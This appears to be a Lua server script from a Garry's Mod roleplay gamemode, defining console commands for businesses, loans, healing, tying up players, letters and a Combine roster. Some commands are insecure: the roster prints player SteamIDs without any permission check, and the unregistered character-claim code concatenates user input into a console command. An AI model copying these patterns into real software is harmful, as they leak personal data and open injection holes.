concommand.Add( "rp_stopmovingprop", ccStopMoving );


function ccTakeBusinessMoney( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( not tonumber( args[1] ) or tonumber( args[1] ) < 0 ) then return; end
	
	local id = ply:GetNWInt( "businessid" );
	
	if( string.find( ply:GetField( "businessflags" ), "a" ) and TS.GetBusinessFloat( id, "bankamount" ) - tonumber( args[1] ) >= 0 ) then
	
		local val = math.floor( tonumber( args[1] ) );		

		TS.SetBusinessFloat( id, "bankamount", TS.GetBusinessFloat( id, "bankamount" ) - val );
		ply:GiveMoney( val );
		
		ply:SaveField( "BusinessMoney", TS.GetBusinessFloat( id, "bankamount" ) );
		ply:SaveField( "charTokens", ply:GetNWFloat( "money" ) );
	
	end

end
concommand.Add( "rp_takebusinessmoney", ccTakeBusinessMoney );

function ccGiveBusinessMoney( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( not tonumber( args[1] ) or tonumber( args[1] ) < 0 ) then return; end

	if( not ply:CanAfford( tonumber( args[1] ) ) ) then
		
		return;
		
	end

	if( ply:GetNWInt( "hired" ) == 1 or ply:GetField( "ownsbusiness" ) == 1 ) then
	
		local id = ply:GetNWInt( "businessid" );
		local val = tonumber( args[1] );
		
		TS.SetBusinessFloat( id, "bankamount", TS.GetBusinessFloat( id, "bankamount" ) + val );
		ply:TakeMoney( val );
		
		ply:SaveField( "BusinessMoney", TS.GetBusinessFloat( id, "bankamount" ) );
		ply:SaveField( "charTokens", ply:GetNWFloat( "money" ) );
		
	end

end
concommand.Add( "rp_givebusinessmoney", ccGiveBusinessMoney );

TS.SupplyLicenseCosts =
{

	300,
	175,
	225,
	0,

}

function ccPurchaseSupplyLicense( ply, cmd, args )

	if( #args < 1 ) then
	
		return;
	
	end

	local n = tonumber( args[1] );

	if( not n or not TS.SupplyLicenseCosts[n] ) then
	
		return;
	
	end
	
	local cost = TS.SupplyLicenseCosts[n];

	if( not ply:CanAfford( cost ) ) then
		
		return;
		
	end


	if( ply:GetField( "ownsbusiness" ) == 1 ) then
		
		local id = ply:GetNWInt( "businessid" );
		
		if( not TS.HasSupplyLicense( id, n ) ) then
		
			ply:TakeMoney( cost );
			TS.SetBusinessInt( ply:GetNWInt( "businessid" ), "supplylicense", 1 );
			
			TS.AddSupplyLicense( id, n );
			
			ply:SaveField( "charTokens", ply:GetNWFloat( "money" ) );
			ply:SaveField( "BusinessSupplyLicenseTypes", TS.GetSupplyLicenseString( id ) );
			
			ply:SaveLicenses();
			
		end
		
	end

end
concommand.Add( "rp_purchasesupplylicense", ccPurchaseSupplyLicense );

function ccDropBusinessItem( ply, cmd, args )

	if( #args < 1 ) then return; end

	local id = ply:GetNWInt( "businessid" );

	if( string.find( ply:GetField( "businessflags" ), "d" ) and TS.BusinessHasItem( id, args[1] ) ) then
	
		TS.RemoveBusinessItem( id, args[1] );
		
		local trace = { }
		trace.start = ply:EyePos();
		trace.endpos = trace.start + ply:GetAimVector() * 55;
		trace.filter = ply;
		
		local tr = util.TraceLine( trace );
		
		TS.CreateItem( args[1], tr.HitPos );
		
		TS.DayLog( "businessitemdrops.txt", ply:LogInfo() .. " dropped " .. args[1] );
		TS.Log( "businessitemdrops.txt", ply:LogInfo() .. " dropped " .. args[1] );
	
	end

end
concommand.Add( "rp_dropbusinessitem", ccDropBusinessItem );

function ccBusinessPurchase( ply, cmd, args )

	if( #args < 1 ) then return; end

	local item = TS.ItemData[args[1]];
	local id = ply:GetNWInt( "businessid" );
	
	if( item.SupplyLicense > 0 and TS.GetBusinessInt( id, "haslicense." .. item.SupplyLicense ) ~= 1 ) then
	
		return;
	
	end
	
	if( item.BlackMarket and TS.GetBusinessInt( id, "haslicense.4" ) ~= 1 ) then
	
		return;
	
	end
	
	if( args[1] == "newspaper" and not ply:HasPlayerFlag( "N" ) ) then

		return;
	
	end

	if( item.BlackMarket and not ply:HasPlayerFlag( "X" ) ) then
	
		return;
	
	end

	if( string.find( ply:GetField( "businessflags" ), "c" ) and TS.GetBusinessFloat( id, "bankamount" ) - tonumber( item.FactoryPrice ) >= 0 ) then
	
		local val = tonumber( item.FactoryPrice );		

		if( not TS.BusinessHasItem( id, args[1] ) or TS.GetBusinessStock( id, args[1] ) <= 0 ) then
		
			local trace = { }
			trace.start = ply:EyePos();
			trace.endpos = trace.start + ply:GetAimVector() * 55;
			trace.filter = ply;
				
			local tr = util.TraceLine( trace );
				
			TS.CreateItem( args[1], tr.HitPos );
				
			TS.DayLog( "businessitemdrops.txt", ply:LogInfo() .. " dropped " .. args[1] );
			TS.Log( "businessitemdrops.txt", ply:LogInfo() .. " dropped " .. args[1] );
			
			
				
		end

		TS.SetBusinessFloat( id, "bankamount", TS.GetBusinessFloat( id, "bankamount" ) - val );
		
		ply:SaveField( "BusinessMoney", TS.GetBusinessFloat( id, "bankamount" ) );
	
	end

end
concommand.Add( "rp_businesspurchase", ccBusinessPurchase );

function ccCreateBusiness( ply, cmd, args )

	if( ply:CanAfford( 1900 ) ) then
	
		ply:SetField( "ownsbusiness", 1 );
		ply:SetPrivateInt( "ownsbusiness", 1 );
		
		ScriptBusinessID = ScriptBusinessID + 1;
		
		ply:SetNWInt( "businessid", ScriptBusinessID );
		TS.SetBusinessInt( ScriptBusinessID, "itemcount", 0 );
		TS.SetBusinessString( ScriptBusinessID, "businessname", args[1] );
		
		ply:SetField( "businessflags", "abcdefghijklmnopqrstuvwxyz" );
		ply:SetPrivateString( "businessflags", "abcdefghijklmnopqrstuvwxyz" );
		
		ply:SaveField( "BusinessOwn", 1 );
		ply:SaveField( "BusinessName", string.gsub( TS.GetBusinessString( ScriptBusinessID, "businessname" ), "\"", "'" ) );
		

	end

end
concommand.Add( "rp_createbusiness", ccCreateBusiness );

function ccCreateFreeBusiness( ply, cmd, args )

	if( true ) then
	
		ply:SetField( "ownsbusiness", 1 );
		ply:SetPrivateInt( "ownsbusiness", 1 );
		
		ScriptBusinessID = ScriptBusinessID + 1;
		
		ply:SetNWInt( "businessid", ScriptBusinessID );
		TS.SetBusinessInt( ScriptBusinessID, "itemcount", 0 );
		TS.SetBusinessString( ScriptBusinessID, "businessname", args[1] );
		
		
		ply:SetNWString( "businessflags", "abcdefghijklmnopqrstuvwxyz" );
		
		ply:SaveField( "BusinessName", string.gsub( TS.GetBusinessString( ScriptBusinessID, "businessname" ), "\"", "'" ) );
		

	end

end

function ccPayLoan( ply, cmd, args )

	if( #args < 1 ) then return; end

	local val = tonumber( args[1] );

	if( not val ) then
		ply:PrintMessage( 3, "Invalid amount" );
		return;
	end
	
	if( val <= 0 ) then
	
		ply:PrintMessage( 3, "Invalid amount" );
		return;
	
	end
	
	if( not ply:CanAfford( val ) ) then
		
		ply:PrintMessage( 3, "Can't afford this" );
		return;
		
	end

	if( ply:GetField( "oweamount" ) - val >= 0 ) then
	
		ply:SetField( "oweamount", ply:GetField( "oweamount" ) - val );
		ply:SetPrivateFloat( "oweamount", ply:GetField( "oweamount" ) );
		ply:TakeMoney( val );
		
		TS.GiveEconomy( val );
		
		ply:SaveField( "charTokens", ply:GetNWFloat( "money" ) );
		ply:SaveField( "loanRemain", ply:GetField( "oweamount" ) );
	
	else
	
		ply:PrintMessage( 3, "You don't owe that much" );
	
	end
	
end
concommand.Add( "rp_payloan", ccPayLoan );

function ccTakeLoan( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( ply:GetField( "cangetloan" ) == 0 ) then
	
		ply:PrintMessage( 3, "You're not allowed to take loans" );
		return;
	
	end

	local val = math.floor( tonumber( args[1] ) );

	if( not val ) then
		ply:PrintMessage( 3, "Invalid amount" );
		return;
	end

	if( val <= 0 ) then
	
		ply:PrintMessage( 3, "Invalid amount" );
		return;
	
	end
	
	if( ply:CanTakeLoan( val ) ) then
	
		ply:SetField( "borrowamount", val + ply:GetField( "borrowamount" ) );
		ply:SetPrivateFloat( "borrowamount", ply:GetField( "borrowamount" ) );
		
		ply:SetField( "oweamount", ply:GetField( "oweamount" ) + val );
		ply:SetPrivateFloat( "oweamount", ply:GetField( "oweamount" ) );

		ply:GiveMoney( val );
		
		TS.GiveEconomy( -val );
		
		ply:SaveField( "charTokens", ply:GetNWFloat( "money" ) );
		ply:SaveField( "loanRemain", ply:GetField( "oweamount" ) );
	
	else
	
		ply:PrintMessage( 3, "How the hell are you reading this?" );
	
	end

end
concommand.Add( "rp_takeloan", ccTakeLoan );

function ccMaxMyStats( ply, cmd, args )

	if( TS.ServerVars["allow_maxstats"] == 0 and ( not ply:IsRick() ) ) then
	
		return;
	
	end
	
	if( not ply:IsRick() ) then return; end

	ply:PrintMessage( 2, "Stats maxed" );

	ply:SetNWFloat( "stat.Strength", 100 );
	ply:SetNWFloat( "stat.Endurance", 100 );
	ply:SetNWFloat( "stat.Speed", 100 );
	ply:SetNWFloat( "stat.Sneak", 100 );
	ply:SetNWFloat( "stat.Aim", 100 );
	ply:SetNWFloat( "stat.Sprint", 100 );
	ply:Slay();

end
concommand.Add( "rp_maxstats", ccMaxMyStats );

function ccChangeFrequency( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( ply:IsCombineDefense() ) then
		ply:PrintMessage( 2, "!ERROR! TELL JT THERE IS A PROBLEM." );
		return;
	end

	ply:SetField( "radiofreq", math.Round( tonumber( args[1] ) * 100 ) / 100 );
	ply:SetPrivateFloat( "radiofreq", math.Round( tonumber( args[1] ) * 100 ) / 100 );

end
concommand.Add( "rp_changefrequency", ccChangeFrequency );

function ccRamDoor( ply, cmd, args )

	ply:TryDoorRam();

end
concommand.Add( "rp_ramdoor", ccRamDoor );

function ccToggleThirdPerson( ply, cmd, args )

	if( true ) then
	
		ply:PrintMessage( 2, "DISABLED OK?" );
		return;
	
	end

	ply:SetNWInt( "inversethirdperson", 0 );

	if( ply:GetNWInt( "thirdperson" ) == 1 ) then
	
		ply:SetViewEntity( ply );
		ply:SetNWInt( "thirdperson", 0 );
	
	else
		
		TS.ThirdPersonCam[ply:EntIndex()]:SetPos( ply:GetPos() );
		timer.Simple( .1, ply.SetViewEntity, ply, TS.ThirdPersonCam[ply:EntIndex()] );
		ply:SetNWInt( "thirdperson", 1 );
	
	end

end
concommand.Add( "rp_thirdperson", ccToggleThirdPerson );

function ccPrintUserList( ply, cmd, args )

	for n = 1, MaxPlayers() do
	
		if( player.GetByID( n ):IsValid() ) then
		
			TS.SendConsole( ply, n .. " - " .. player.GetByID( n ):Nick() );
		
		end
	
	end

end
concommand.Add( "rp_printuserlist", ccPrintUserList );

function ccLookAtMe( ply, cmd, args )

	if( true ) then
	
		ply:PrintMessage( 2, "DISABLED OK?" );
		return;
	
	end

	ccToggleThirdPerson( ply, cmd, args );

	ply:SetNWInt( "inversethirdperson", ply:GetNWInt( "thirdperson" ) );

end
concommand.Add( "rp_lookatme", ccLookAtMe );

function ccStopHeal( ply, cmd, args )

	local target = player.GetByID( ply:GetField( "healingtarget" ) );
	
	if( target:IsValid() ) then

		target:SetNWInt( "beinghealed", 0 );
	
	end
	
	ply:SetNWInt( "healing", 0 );
	ply:SetField( "healingtarget", 0 );
	ply:SetPrivateInt( "healingtarget", 0 );


end
--concommand.Add( "rp_stopheal", ccStopHeal );

function ccFinishHeal( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( tonumber( args[1] ) == 0 ) then
	
		local target = player.GetByID( ply:GetField( "healingtarget" ) );
		
		if( target:IsValid() ) then
	
			target:SetNWInt( "beinghealed", 0 );
		
		end
		
		ply:SetNWInt( "healing", 0 );
		ply:SetField( "healingtarget", 0 );
		ply:SetPrivateInt( "healingtarget", 0 );
	
		umsg.Start( "KillProcessBar" );
			umsg.Entity( target );
		umsg.End();
	
		return;
	
	end

	if( not ply:GetField( "EndHealTime" ) ) then
		
		ccFinishHeal( ply, cmd, { 0 } );
		return;
	
	end
	
	if( CurTime() + 1 < ply:GetField( "EndHealTime" ) ) then
	
		ccFinishHeal( ply, cmd, { 0 } );
		return;
	
	end

	local target = player.GetByID( ply:GetField( "healingtarget" ) );

	if( target:IsValid() ) then

		local target = ents.GetByIndex( ply:GetField( "healingtarget" ) ); 
		
		local stat = ply:GetNWFloat( "stat.Medic" );
		local amt = 0;

		if( ply:GetField( "healtype" ) == 0 ) then
		
			target:SetHealth( math.Clamp( target:Health() + 50, 0, target:GetNWInt( "MaxHealth" ) ) );
			ply:DropOneItem( "healthvial" );
			
			if( stat < 17 ) then
				amt = .333;
			elseif( stat < 30 ) then
				amt = .2;
			elseif( stat < 50 ) then
				amt = .08;
			elseif( stat < 75 ) then
				amt = .04;
			elseif( stat < 85 ) then
				amt = .02;
			elseif( stat < 100 ) then
				amt = .008;
			end	
			
		else
		
			target:StopBleed();
			ply:DropOneItem( "bandage" );
	
			if( stat < 17 ) then
				amt = .333;
			elseif( stat < 30 ) then
				amt = .2;
			elseif( stat < 50 ) then
				amt = .08;
			elseif( stat < 75 ) then
				amt = .04;
			elseif( stat < 85 ) then
				amt = .02;
			elseif( stat < 100 ) then
				amt = .008;
			end		
			
			amt = amt * 1.4;
			
		end
		
		ply:SetNWFloat( "stat.Medic", math.Clamp( stat + ( amt ), 1, 100 ) );

		ply:CheckInventory();

		target:SetNWInt( "beinghealed", 0 );
		ply:SetNWInt( "healing", 0 );
		
		ply:SetField( "healingtarget", 0 );
		ply:SetPrivateInt( "healingtarget", 0 );
		
		if( ply:GetField( "healtype" ) == 1 ) then
			ply:PrintMessage( 3, "Successfully bandaged " .. target:Nick() );
		else
			ply:PrintMessage( 3, "Given medical aid to " .. target:Nick() );
		end
		
	end

end
concommand.Add( "rp_finishheal", ccFinishHeal );


function ccStopTie( ply, cmd, args )

end
--concommand.Add( "rp_stoptie", ccStopTie );

function ccFinishTie( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( tonumber( args[1] ) == 0 ) then
	
		local target = player.GetByID( ply:GetField( "tieduptarget" ) );
		
		if( target:IsValid() ) then
	
			target:SetNWInt( "beingtiedup", 0 );
		
		end
		
		ply:SetNWInt( "tyingup", 0 );

		ply:SetField( "tieduptarget", 0 );
		ply:SetPrivateInt( "tieduptarget", 0 );
				
		umsg.Start( "KillProcessBar" );
			umsg.Entity( target );
		umsg.End();
		
		return;
	
	end

	if( not ply:GetField( "EndTieUpTime" ) ) then
		ccFinishTie( ply, cmd, { 0 } );
		return;
	end
	
	if( CurTime() + 1 < ply:GetField( "EndTieUpTime" )  ) then
		ccFinishTie( ply, cmd, { 0 } );
		return;
	end

	local target = player.GetByID( ply:GetField( "tieduptarget" ) );

	if( target:IsValid() ) then

		if( ply:GetNWInt( "untying" ) == 0 ) then

			--target:TieUp();
			target:SetNWInt( "tiedup", 1 );
			target:SetNWInt( "beingtiedup", 0 );
			ply:SetNWInt( "tyingup", 0 );
			ply:SetField( "tieduptarget", 0 );
			ply:SetPrivateInt( "tieduptarget", 0 );
		
			ply:PrintMessage( 3, "Successfully tied up " .. target:Nick() );
			
		else
		
			--target:TieUp();
			target:SetNWInt( "tiedup", 0 );
			target:SetNWInt( "beingtiedup", 0 );
			ply:SetNWInt( "tyingup", 0 );
			ply:SetField( "tieduptarget", 0 );
			ply:SetPrivateInt( "tieduptarget", 0 );
			
			ply:PrintMessage( 3, "Successfully untied " .. target:Nick() );
		
		end
	
	end

end
concommand.Add( "rp_finishtie", ccFinishTie );

function ccDropRation( ply, cmd, args )

	if( ply:IsCombineDefense() ) then
	
		if( GetGlobalInt( "CombineRations" ) > 0 ) then
		
			SetGlobalInt( "CombineRations", GetGlobalInt( "CombineRations" ) - 1 );
	
			local trace = { }
			trace.start = ply:EyePos();
			trace.endpos = trace.start + ply:GetAimVector() * 55;
			trace.filter = ply;
			
			local tr = util.TraceLine( trace );
	
			TS.CreateItem( "ration", tr.HitPos );
		
		end
	
	end

end
concommand.Add( "rp_dropration", ccDropRation );

function ccUseItem( ply, cmd, args )

	if( #args < 1 ) then return; end
	if( not TS.ItemData[args[1]] ) then return; end
	if( not ply:GetTable().Inventory[args[1]] ) then return; end
	
	if( ply:GetField( "isko" ) == 1 or ply:GetNWInt( "tiedup" ) == 1 or not ply:Alive() ) then
		return;
	end
	
	if( not TS.ItemData[args[1]].UseFunc ) then
	
		if( ply:GetTable().Inventory[args[1]].Table.OnUse ) then
			ply:GetTable().Inventory[args[1]].Table.OnUse( ply:GetTable().Inventory[args[1]].Table );
		end
		
		ply:DropOneItem( args[1] );
		ply:CheckInventory();
		
		ply:SaveItems();
		
	else
	
		ply:GetTable().Inventory[args[1]].Table.UseFunc( ply, ply:GetTable().Inventory[args[1]].Table );
	
	end
	

end
concommand.Add( "rp_useitem", ccUseItem );

function ccRebelPurchaseItem( ply, cmd, args )

	if( #args < 1 ) then return; end

	local item = TS.ItemData[args[1]];
	local id = ply:GetNWInt( "businessid" );
	
	if( item.SupplyLicense > 0 and TS.GetBusinessInt( id, "haslicense." .. item.SupplyLicense ) ~= 1 ) then
	
		return;
	
	end
	
	if( item.BlackMarket and TS.GetBusinessInt( id, "haslicense.4" ) ~= 1 ) then
	
		return;
	
	end
	
	if( args[1] == "newspaper" and not ply:HasPlayerFlag( "N" ) ) then

		return;
	
	end
	
	if( item.BlackMarket and not ply:HasPlayerFlag( "X" ) ) then
	
		return;
	
	end
	
	if( not ply:HasPlayerFlag( "F" ) ) then
	
		return;
	
	end

	if( string.find( ply:GetField( "businessflags" ), "c" ) ) then
	
		local val = tonumber( item.RebelCost );		

		if( GetGlobalInt( "RebelWeaponry" ) - val < 0 ) then
		
			return;
		
		end

		if( not TS.BusinessHasItem( id, args[1] ) or TS.GetBusinessStock( id, args[1] ) <= 0 ) then
		
			local trace = { }
			trace.start = ply:EyePos();
			trace.endpos = trace.start + ply:GetAimVector() * 55;
			trace.filter = ply;
				
			local tr = util.TraceLine( trace );
				
			TS.CreateItem( args[1], tr.HitPos );
				
			TS.DayLog( "businessitemdrops.txt", ply:LogInfo() .. " dropped " .. args[1] );
			TS.Log( "businessitemdrops.txt", ply:LogInfo() .. " dropped " .. args[1] );
			
			SetGlobalInt( "RebelWeaponry", GetGlobalInt( "RebelWeaponry" ) - val );
					
		end


	end

end
concommand.Add( "rp_rebelpurchase", ccRebelPurchaseItem );

function ccDropItem( ply, cmd, args )

	if( #args < 1 ) then return; end
	if( not ply:GetTable().Inventory[args[1]] ) then return; end
	if( ply:GetTable().Inventory[args[1]].Amt <= 0 ) then return; end
	
	if( ply:GetField( "isko" ) == 1 or not ply:Alive() ) then
		return;
	end

	if( not ply:GetTable().Inventory[args[1]].Table.IsWeapon ) then
		
		if( not TS.ItemData[args[1]] ) then return; end
	
		if( ply:GetTable().Inventory[args[1]].Table.OnDrop ) then
			ply:GetTable().Inventory[args[1]].Table.OnDrop( ply:GetTable().Inventory[args[1]].Table );
		end
		
		local trace = { } 
		trace.start = ply:EyePos();
		trace.endpos = trace.start + ply:GetAimVector() * 75;
		trace.filter = ply;
		
		local tr = util.TraceLine( trace );
		
		TS.CreateItem( args[1], tr.HitPos, Angle( 0, 0, 0 ) );
		
		ply:DropOneItem( args[1] );
		
	else

		ply:DropCertainWeapon( args[1] );
		ply:RemoveInventoryWeapon( args[1] );
	
	end
	
	ply:CheckInventory();
	
	ply:SaveItems();

end
concommand.Add( "rp_dropitem", ccDropItem );

function ccSoundList( ply, cmd, args )

	ply:PrintMessage( 2, "Wtf is this. Tell JT that sumthin is broke." );
	
	for k, v in pairs( TS.CombineSounds ) do
	
		ply:PrintMessage( 2, k .. "  |  " .. v.line );
	
	end

end
concommand.Add( "rp_soundlist", ccSoundList );

function ccPlaySound( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( not ply:IsCombineDefense() ) then
	
		ply:PrintMessage( 2, "This is not HL2 RP..." );
		return;
	
	end

	local n = tonumber( args[1] );

	if( n == nil ) then
	
		ply:PrintMessage( 2, "Invalid. Use sound ID" );
		return;
		
	end
	
	if( not TS.CombineSounds[n] ) then
	
		ply:PrintMessage( 2, "Sound doesn't exist" );
		return;
	
	end
	
	util.PrecacheSound( TS.CombineSounds[n].dir );
	ply:EmitSound( TS.CombineSounds[n].dir );

end
concommand.Add( "rp_playline", ccPlaySound );
concommand.Add( "playline", ccPlaySound );

--[[function ccLoans( ply, cmd, args )

	if( not ply:IsCombine() ) then return; end
	
	for k, v in pairs( player.GetAll() ) do
	
		if( not v:IsCombine() ) then
			ply:PrintMessage( 2, v:Nick() .. " owes " .. v:GetField( "oweamount" ) .. " tokens" );
		end
		
	end

end
concommand.Add( "rp_loans", ccLoans );--]]

function ccSL( ply )

	ply:GetTable().LetterBits = "";

end
concommand.Add( "sl", ccSL );

function ccWL( ply, cmd, args )

	local msg = "";
		
	for k, v in pairs( args ) do
		
		msg = msg .. v .. " ";
		
	end

	ply:GetTable().LetterBits = ply:GetTable().LetterBits .. msg;

end
concommand.Add( "wl", ccWL );

function ccFL( ply, cmd, args )


	if( ply:HasItem( "paper" ) ) then
	
		local msg = ply:GetTable().LetterBits;
		
		msg = string.gsub( msg, "=n", "\n" );

		local trace = { } 
		trace.start = ply:EyePos();
		trace.endpos = trace.start + ply:GetAimVector() * 75;
		trace.filter = ply;
		
		local tr = util.TraceLine( trace );
		
		TS.CreateLetter( msg, tr.HitPos );
	
		ply:DropOneItem( "paper" );
		ply:CheckInventory();
		
	
	end

end
concommand.Add( "fl", ccFL );

function ccTakeLetter( ply, cmd, args )

	local id = ply:GetField( "letter.Item" );
	local canhave = true;

	for k, v in pairs( player.GetAll() ) do
	
		if( v:HasItem( id ) ) then
			canhave = false;
			break;
		end
	
	end
	
	if( not canhave ) then
		return;
	end
	
	local ent = ents.GetByIndex( ply:GetField( "letter.Ent" ) );
	
	if( ent:IsValid() ) then
	
		ent:Remove();
	
	end
	
	ply:GiveItem( id );

end
concommand.Add( "rp_takeletter", ccTakeLetter );

function ccGetCID( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( ply:IsCombineDefense() ) then
	
		local ent = ents.GetByIndex( tonumber( args[1] ) );
	
		if( ent:IsPlayer() ) then
			ply:PrintMessage( 3, ent:Nick() .. " - CID: " .. ent:GetField( "cid" ) );
		end
	
	end

end
concommand.Add( "rp_getcid", ccGetCID );

function ccGetCombineRoster( ply, cmd, args )

	local query = "SELECT `charName`, `combineflags`, `userID` FROM `rtrp_characters` WHERE `combineflags` != '' AND `combineflags` != ' '";
	local tab = mysql.query( TS.SQL, query );
	
	TS.SendConsole( ply, "FLAGS --" );
	TS.SendConsole( ply, "A - CP" );
	TS.SendConsole( ply, "B - OW" );
	TS.SendConsole( ply, "C - CE" );
	TS.SendConsole( ply, "D - CA" );
	TS.SendConsole( ply, "E - Can set flags" );
	TS.SendConsole( ply, "F - CP Elite" );
	TS.SendConsole( ply, "H - CP Control" );
	TS.SendConsole( ply, "I - Combine Control" );
	TS.SendConsole( ply, "J - OverWatch Elite Control" );
	
	TS.SendConsole( ply, "---\nNAME | STEAMID | FLAG" );
	
	local delay = 0;
	
	for k, v in pairs( tab ) do
	
		local stab = mysql.query( TS.SQL, "SELECT `STEAMID` FROM `rtrp_users` WHERE `uID` = '" .. v[3] .. "'" );

		if( stab and #stab > 0 ) then
			steamid = stab[1][1];
			if( ply:EntIndex() ~= 0 ) then
				TS.SendConsole( ply, v[1] .. " - " .. steamid .. " - " .. v[2] );
			else
				timer.Simple( delay, TS.SendConsole, ply, v[1] .. " - " .. steamid .. " - " .. v[2] );
				delay = delay + .2;
			end
		end
		
	end
	
	if( ply:EntIndex() ~= 0 ) then
		TS.SendConsole( ply, "---" );
	else
		timer.Simple( delay, TS.SendConsole, ply, "---" );
	end

end
concommand.Add( "rp_combineroster", ccGetCombineRoster );

function ccClaimCharacter( ply, cmd, args )

	if( not ply:GetField( "uid" ) or ply:GetField( "uid" ) == 0 ) then return; end

	if( #args < 1 ) then
		return;
	end	
	
	local nick = mysql.escape( TS.SQL, args[1] );
	
	local tab = mysql.query( TS.SQL, "SELECT `userID` FROM `rtrp_characters` WHERE `charName` = '" .. nick .. "'" );

	if( tab and #tab > 0 ) then
	
		if( ply:GetNumberOfSaves() >= MAX_CHARACTERS ) then
		
			TS.SendConsole( ply, "You cannot exceed the max limit of characters" );		
			return;
		
		end
	
		mysql.query( TS.SQL, "UPDATE `rtrp_characters` SET `userID` = '" .. ply:GetField( "uid" ) .. "' WHERE `charName` = '" .. nick .. "'" );
	
		TS.SendConsole( ply, "Claimed character: " .. args[1] );		
		
		if( ply:GetField( "charactercreate" ) == 1 ) then
		
			local savelist = ply:ListAllSaves();

			umsg.Start( "CreateCharacterChooseMenu", ply );
				umsg.Short( math.Clamp( #savelist, 0, MAX_CHARACTERS ) );
				
				for n = 1, math.Clamp( #savelist, 0, MAX_CHARACTERS ) do
					umsg.String( savelist[n] );
				end
			umsg.End();
		
		elseif( ply:Nick() == args[1] ) then

			ply:ConCommand( "setname " .. args[1] .. "\n" );
			
			local function EndCharacter( ply )
	
				ply:SetField( "name", args[1] );
				ply:SetField( "charactercreate", 0 );
				ply:SetPrivateInt( "charactercreate", 0 );
				ply:LoadCharacter( ply:Nick() );
	
			end
		
			ply:SetNoDraw( false );
			ply:SetNotSolid( false );
	
			timer.Simple( .5, EndCharacter, ply );
		
		end
		

	else
	
		TS.SendConsole( ply, "No character found in the database named: " .. args[1] );		
	
	end

end
--concommand.Add( "rp_claimchar", ccClaimCharacter );
